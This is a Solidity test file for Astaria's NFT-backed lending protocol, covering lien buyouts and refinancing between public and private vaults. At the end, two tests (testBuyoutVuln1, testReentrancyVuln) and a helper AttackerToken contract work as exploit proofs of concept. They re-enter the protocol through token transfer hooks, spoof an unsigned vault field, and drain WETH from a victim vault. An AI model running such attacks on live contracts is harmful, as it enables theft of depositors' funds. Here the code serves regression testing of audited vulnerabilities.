// SPDX-License-Identifier: BUSL-1.1

/**
 *  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗
 * ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗
 * ███████║███████╗   ██║   ███████║██████╔╝██║███████║
 * ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║
 * ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║
 * ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
 *
 * Astaria Labs, Inc
 */

pragma solidity =0.8.17;

import "forge-std/Test.sol";

import {Authority} from "solmate/auth/Auth.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {
  MultiRolesAuthority
} from "solmate/auth/authorities/MultiRolesAuthority.sol";

import {
  IERC1155Receiver
} from "openzeppelin/token/ERC1155/IERC1155Receiver.sol";
import {Strings} from "openzeppelin/utils/Strings.sol";

import {ERC721} from "gpl/ERC721.sol";

import {ICollateralToken} from "../interfaces/ICollateralToken.sol";
import {ILienToken} from "../interfaces/ILienToken.sol";
import {IPublicVault} from "../interfaces/IPublicVault.sol";
import {CollateralToken, IFlashAction} from "../CollateralToken.sol";
import {IAstariaRouter, AstariaRouter} from "../AstariaRouter.sol";
import {VaultImplementation} from "../VaultImplementation.sol";
import {IVaultImplementation} from "../interfaces/IVaultImplementation.sol";
import {LienToken} from "../LienToken.sol";
import {PublicVault} from "../PublicVault.sol";
import {TransferProxy} from "../TransferProxy.sol";
import {WithdrawProxy} from "../WithdrawProxy.sol";

import {Strings2} from "./utils/Strings2.sol";

import "./TestHelpers.t.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract AttackerToken is ERC20, TestHelpers {
  using CollateralLookup for address;
  bool attack = false;
  address victim;
  ILienToken.Stack[] stack;
  address tokenContract;
  uint256 tokenId;
  ILienToken lienToken;
  ICollateralToken collatToken;
  IAstariaRouter router;

  constructor() ERC20("AttackerToken", "ATK", uint8(18)) {}

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) public override returns (bool) {
    balanceOf[to] += amount;
    if (attack) {
      attack = false;
      _startAttack();
    }
    return true;
  }

  function transfer(address to, uint256 amount) public override returns (bool) {
    balanceOf[to] += amount;
    if (attack) {
      attack = false;
      _startAttack();
    }
    return true;
  }

  function setAttack(
    address _victim,
    ILienToken.Stack memory _stack,
    address _tokenContract,
    uint256 _tokenId,
    ILienToken _lienToken,
    ICollateralToken _collatToken,
    IAstariaRouter _router
  ) public {
    attack = true;
    victim = _victim;
    stack.push(_stack);
    tokenContract = _tokenContract;
    tokenId = _tokenId;
    lienToken = _lienToken;
    collatToken = _collatToken;
    router = _router;
  }

  function _startAttack() private {
    lienToken.makePayment(stack[0].lien.collateralId, stack, 0, 10000 ether);

    IAstariaRouter.Commitment[]
      memory commitments = new IAstariaRouter.Commitment[](1);

    ILienToken.Stack[] memory emptyStack = new ILienToken.Stack[](0);

    commitments[0] = _generateValidTerms({
      vault: victim,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      stack: emptyStack
    });
    collatToken.setApprovalForAll(address(router), true);
    router.commitToLiens(commitments);
  }

  function drain(ERC20 WETH9) public {
    WETH9.transfer(msg.sender, WETH9.balanceOf(address(this)));
  }
}

contract WorthlessToken is ERC20 {
  constructor() ERC20("WorthlessToken", "WTK", uint8(18)) {}

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) public override returns (bool) {
    balanceOf[to] += amount;
    return true;
  }

  function transfer(address to, uint256 amount) public override returns (bool) {
    balanceOf[to] += amount;
    return true;
  }
}

contract RefinanceTesting is TestHelpers {
  using FixedPointMathLib for uint256;
  using CollateralLookup for address;

  function testPrivateVaultBuysPublicVaultLien() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 7 days);

    uint256 accruedInterest = uint256(LIEN_TOKEN.getOwed(stack[0]));
    uint256 tenthOfRemaining = (uint256(
      LIEN_TOKEN.getOwed(stack[0], block.timestamp + 3 days)
    ) - accruedInterest).mulDivDown(1, 10);

    uint256 buyoutFee = _locateCurrentAmount({
      startAmount: tenthOfRemaining,
      endAmount: 0,
      startTime: 1,
      endTime: 1 + standardLienDetails.duration.mulDivDown(900, 1000),
      roundUp: true
    });

    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );
    vm.startPrank(strategistTwo);
    VaultImplementation(privateVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
    vm.stopPrank();

    assertEq(
      WETH9.balanceOf(privateVault),
      40 ether - buyoutFee - (accruedInterest - stack[0].point.amount),
      "Incorrect PrivateVault balance"
    );
    assertEq(
      WETH9.balanceOf(publicVault),
      50 ether + buyoutFee + ((accruedInterest - stack[0].point.amount)),
      "Incorrect PublicVault balance"
    );
    assertEq(
      PublicVault(publicVault).getYIntercept(),
      50 ether + buyoutFee + ((accruedInterest - stack[0].point.amount)),
      "Incorrect PublicVault YIntercept"
    );
    assertEq(
      PublicVault(publicVault).totalAssets(),
      50 ether + buyoutFee + (accruedInterest - stack[0].point.amount),
      "Incorrect PublicVault YIntercept"
    );
    assertEq(
      PublicVault(publicVault).getSlope(),
      0,
      "Incorrect PublicVault slope"
    );

    _signalWithdraw(address(1), publicVault);
    _warpToEpochEnd(publicVault);
    PublicVault(publicVault).processEpoch();
    PublicVault(publicVault).transferWithdrawReserve();

    WithdrawProxy withdrawProxy = PublicVault(publicVault).getWithdrawProxy(0);

    withdrawProxy.redeem(
      withdrawProxy.balanceOf(address(1)),
      address(1),
      address(1)
    );
    assertEq(
      WETH9.balanceOf(address(1)),
      50 ether + buyoutFee + (accruedInterest - stack[0].point.amount),
      "Incorrect withdrawer balance"
    );
  }

  function testCannotBuyoutLienDifferentCollateral() public {
    TestNFT nft = new TestNFT(2);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });
    // borrow 10 eth against the dummy NFT
    (, ILienToken.Stack[] memory stack2) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: uint256(1),
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 3 days);

    uint256 accruedInterest = uint256(LIEN_TOKEN.getOwed(stack[0]));
    uint256 tenthOfRemaining = (uint256(
      LIEN_TOKEN.getOwed(stack[0], block.timestamp + 7 days)
    ) - accruedInterest).mulDivDown(1, 10);

    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: uint256(1),
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );

    vm.expectRevert(
      abi.encodeWithSelector(
        ILienToken.InvalidState.selector,
        ILienToken.InvalidStates.INVALID_HASH
      )
    );
    VaultImplementation(privateVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
  }

  // Adapted from C4 #303 and #319 with new fee structure
  function testBuyoutLienBothPublicVault() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 9 days);

    uint256 owed = uint256(LIEN_TOKEN.getOwed(stack[0]));

    address publicVault2 = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    ILienToken.Details memory sameRateRefinance = refinanceLienDetails;
    sameRateRefinance.rate = getWadRateFromDecimal(150);

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: publicVault2,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: sameRateRefinance,
      amount: 10 ether,
      stack: stack
    });

    _lendToVault(
      Lender({addr: address(2), amountToLend: 50 ether}),
      publicVault2
    );

    uint256 originalSlope = PublicVault(publicVault).getSlope();

    VaultImplementation(publicVault2).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );

    assertEq(
      WETH9.balanceOf(publicVault2),
      50 ether - owed,
      "Incorrect PublicVault2 balance"
    );
    assertEq(
      WETH9.balanceOf(publicVault),
      50 ether + (owed - stack[0].point.amount),
      "Incorrect PublicVault balance"
    );
    assertEq(
      PublicVault(publicVault).getYIntercept(),
      50 ether + (owed - stack[0].point.amount),
      "Incorrect PublicVault YIntercept"
    );
    assertEq(
      PublicVault(publicVault).totalAssets(),
      50 ether + (owed - stack[0].point.amount),
      "Incorrect PublicVault totalAssets"
    );
    assertEq(
      PublicVault(publicVault).getSlope(),
      0,
      "Incorrect PublicVault slope"
    );

    _signalWithdraw(address(1), publicVault);
    _warpToEpochEnd(publicVault);
    PublicVault(publicVault).processEpoch();
    PublicVault(publicVault).transferWithdrawReserve();

    WithdrawProxy withdrawProxy = PublicVault(publicVault).getWithdrawProxy(0);

    withdrawProxy.redeem(
      withdrawProxy.balanceOf(address(1)),
      address(1),
      address(1)
    );
    assertEq(
      WETH9.balanceOf(address(1)),
      50 ether + (owed - stack[0].point.amount),
      "Incorrect withdrawer balance"
    );

    _warpToEpochEnd(publicVault2);
    PublicVault(publicVault2).processEpoch();

    assertEq(
      WETH9.balanceOf(publicVault2),
      50 ether - owed,
      "Incorrect PublicVault2 balance"
    );

    assertEq(
      PublicVault(publicVault2).totalAssets(),
      50 ether +
        ((14 * 1 days + 1) * getWadRateFromDecimal(150).mulWadDown(owed)),
      "Target PublicVault totalAssets incorrect"
    );
    assertTrue(
      PublicVault(publicVault2).getYIntercept() != 0,
      "Incorrect PublicVault2 YIntercept"
    );
    assertEq(
      PublicVault(publicVault2).getYIntercept(),
      50 ether,
      "Incorrect PublicVault2 YIntercept"
    );
  }

  function getWadRateFromDecimal(
    uint256 decimal
  ) internal pure returns (uint256) {
    return uint256(1e16).mulDivDown(decimal, 365 days);
  }

  function testPublicVaultCannotBuyoutBefore90PercentDurationOver() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 7 days);

    address publicVault2 = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    ILienToken.Details memory sameRateRefinance = refinanceLienDetails;
    sameRateRefinance.rate = (uint256(1e16) * 150) / (365 days);

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: publicVault2,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: sameRateRefinance,
      amount: 10 ether,
      stack: stack
    });

    _lendToVault(
      Lender({addr: address(2), amountToLend: 50 ether}),
      publicVault2
    );

    vm.expectRevert(
      abi.encodeWithSelector(ILienToken.RefinanceBlocked.selector)
    );
    VaultImplementation(publicVault2).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
  }

  function testSamePublicVaultRefinanceHasNoFee() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    assertEq(
      LIEN_TOKEN.getPayee(stack[0].point.lienId),
      publicVault,
      "ASDFASDFDSAF"
    );

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    VaultImplementation(publicVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );

    assertEq(
      WETH9.balanceOf(publicVault),
      40 ether,
      "PublicVault was charged a fee"
    );
  }

  function testSamePrivateVaultRefinanceHasNoFee() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });

    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );

    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    assertEq(
      LIEN_TOKEN.getPayee(stack[0].point.lienId),
      strategistOne,
      "ASDFASDFDSAF"
    );
    assertEq(LIEN_TOKEN.ownerOf(stack[0].point.lienId), strategistOne, "fuck");

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    VaultImplementation(privateVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );

    assertEq(
      WETH9.balanceOf(privateVault),
      30 ether,
      "PrivateVault was charged a fee"
    );

    assertEq(
      WETH9.balanceOf(strategistOne),
      10 ether,
      "Strategist did not receive buyout amount"
    );
  }

  function testFailCannotRefinanceAsNotVault() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 7 days);

    uint256 accruedInterest = uint256(LIEN_TOKEN.getOwed(stack[0]));
    uint256 tenthOfRemaining = (uint256(
      LIEN_TOKEN.getOwed(stack[0], block.timestamp + 3 days)
    ) - accruedInterest).mulDivDown(1, 10);

    uint256 buyoutFee = _locateCurrentAmount({
      startAmount: tenthOfRemaining,
      endAmount: 0,
      startTime: 1,
      endTime: 1 + standardLienDetails.duration.mulDivDown(900, 1000),
      roundUp: true
    });

    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );

    vm.startPrank(strategistTwo);
    LIEN_TOKEN.buyoutLien(
      ILienToken.LienActionBuyout({
        chargeable: true,
        position: uint8(0),
        encumber: ILienToken.LienActionEncumber({
          amount: accruedInterest,
          receiver: address(1),
          lien: ASTARIA_ROUTER.validateCommitment({
            commitment: refinanceTerms,
            timeToSecondEpochEnd: 0
          }),
          stack: stack
        })
      })
    );
    vm.stopPrank();
  }

  function testRefinanceBackAndForth() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });
    // skip(2 days);
    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });
    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );
    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });
    vm.startPrank(strategistTwo);
    (stack, ) = VaultImplementation(privateVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
    vm.stopPrank();
    skip(24 days);
    ILienToken.Details memory refinanceLienDetails2 = refinanceLienDetails;
    refinanceLienDetails2.rate = (uint256(1e16) * 100) / (365 days);
    IAstariaRouter.Commitment memory refinanceTerms2 = _generateValidTerms({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails2,
      amount: 10 ether,
      stack: stack
    });
    vm.startPrank(strategistTwo);
    VaultImplementation(publicVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms2
    );
    vm.stopPrank();
  }

  function testPrivateVaultBuyoutPastDurationFeeCap() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    uint256 initialBalance = WETH9.balanceOf(address(this));

    // create a PublicVault with a 14-day epoch
    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    // lend 50 ether to the PublicVault as address(1)
    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    // borrow 10 eth against the dummy NFT
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 10 ether,
      isFirstLien: true
    });

    skip(9 days + 500);

    address privateVault = _createPrivateVault({
      strategist: strategistOne,
      delegate: strategistTwo
    });

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: refinanceLienDetails,
      amount: 10 ether,
      stack: stack
    });

    _lendToPrivateVault(
      PrivateLender({
        addr: strategistOne,
        token: address(WETH9),
        amountToLend: 50 ether
      }),
      privateVault
    );
    vm.startPrank(strategistTwo);
    VaultImplementation(privateVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
    vm.stopPrank();
  }

  function testBuyoutVuln1() public {
    uint256 alicePK = uint256(0x8888); // malicious user
    address alice = vm.addr(alicePK);
    address bob = address(2); // normal user
    WorthlessToken wt = new WorthlessToken();

    address goodPublicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    _lendToVault(Lender({addr: bob, amountToLend: 100 ether}), goodPublicVault);

    vm.startPrank(alice);
    TestNFT nft = new TestNFT(2);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);
    uint256 tokenId2 = uint256(1);
    address badPublicVault = ASTARIA_ROUTER.newPublicVault(
      14 days,
      alice,
      address(wt),
      0,
      false,
      new address[](0),
      uint256(0)
    );

    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: badPublicVault,
      strategist: alice,
      strategistPK: alicePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: ILienToken.Details({
        maxAmount: 100 ether,
        rate: (uint256(1e16) * 150) / (365 days),
        duration: 10 days,
        maxPotentialDebt: 100 ether,
        liquidationInitialAsk: 500 ether
      }),
      amount: 90 ether,
      isFirstLien: true
    });

    vm.stopPrank();

    ILienToken.Details memory sameRateRefinance = ILienToken.Details({
      maxAmount: 100 ether,
      rate: (uint256(1e16) * 150) / (365 days),
      duration: 20 days,
      maxPotentialDebt: 100 ether,
      liquidationInitialAsk: 500 ether
    });

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: goodPublicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: sameRateRefinance,
      amount: 90 ether,
      stack: stack
    });
    refinanceTerms.lienRequest.strategy.vault = badPublicVault;

    // observe that the signature and merkle stuff have already been obtained
    // so the following step is essentially spoofing a field which is not included in the merkle tree and signature
    // and we'll see that this will still pass the signature test

    console.log(
      PublicVault(goodPublicVault).totalAssets(),
      WETH9.balanceOf(goodPublicVault)
    );

    // make sure that alice is tx.origin
    vm.prank(alice, alice);
    (stack, ) = VaultImplementation(goodPublicVault).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );

    _warpToEpochEnd(goodPublicVault);

    console.log(
      PublicVault(goodPublicVault).totalAssets(),
      WETH9.balanceOf(goodPublicVault)
    );

    LIEN_TOKEN.makePayment(stack[0].lien.collateralId, stack, 1000 ether);
    console.log(
      PublicVault(goodPublicVault).totalAssets(),
      WETH9.balanceOf(goodPublicVault)
    );
  }

  function testReentrancyVuln() public {
    uint256 alicePK = uint256(0x8888); // malicious user
    address alice = vm.addr(alicePK);
    address bob = address(2); // normal user
    AttackerToken AT = new AttackerToken();

    address victimVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    _lendToVault(Lender({addr: bob, amountToLend: 100 ether}), victimVault);

    vm.startPrank(alice);
    TestNFT nft = new TestNFT(2);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);
    uint256 tokenId2 = uint256(1);
    address attackerVault = ASTARIA_ROUTER.newPublicVault(
      14 days,
      alice,
      address(AT),
      0,
      false,
      new address[](0),
      uint256(0)
    );
    console.log("Attacker balance before: ", WETH9.balanceOf(alice));
    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: attackerVault,
      strategist: alice,
      strategistPK: alicePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: ILienToken.Details({
        maxAmount: 100 ether,
        rate: (uint256(1e16) * 150) / (365 days),
        duration: 10 days,
        maxPotentialDebt: 100 ether,
        liquidationInitialAsk: 500 ether
      }),
      amount: 90 ether,
      isFirstLien: true
    });

    COLLATERAL_TOKEN.safeTransferFrom(
      alice,
      address(AT),
      stack[0].lien.collateralId
    );

    AT.setAttack(
      victimVault,
      stack[0],
      tokenContract,
      tokenId,
      LIEN_TOKEN,
      COLLATERAL_TOKEN,
      ASTARIA_ROUTER
    );

    stack = LIEN_TOKEN.makePayment(
      stack[0].lien.collateralId,
      stack,
      0,
      5 ether
    );

    // verifies that the lien with victimVault isn't included in the collateralState
    assertEq(stack.length, 1);
    assertEq(tokenContract.computeId(tokenId), stack[0].lien.collateralId);
    assertEq(
      keccak256(abi.encode(stack)),
      LIEN_TOKEN.getCollateralState(tokenContract.computeId(tokenId))
    );
    assertEq(stack[0].lien.vault, attackerVault);

    AT.drain(WETH9);
    vm.stopPrank();

    console.log("Attacker balance after: ", WETH9.balanceOf(alice));
  }
}
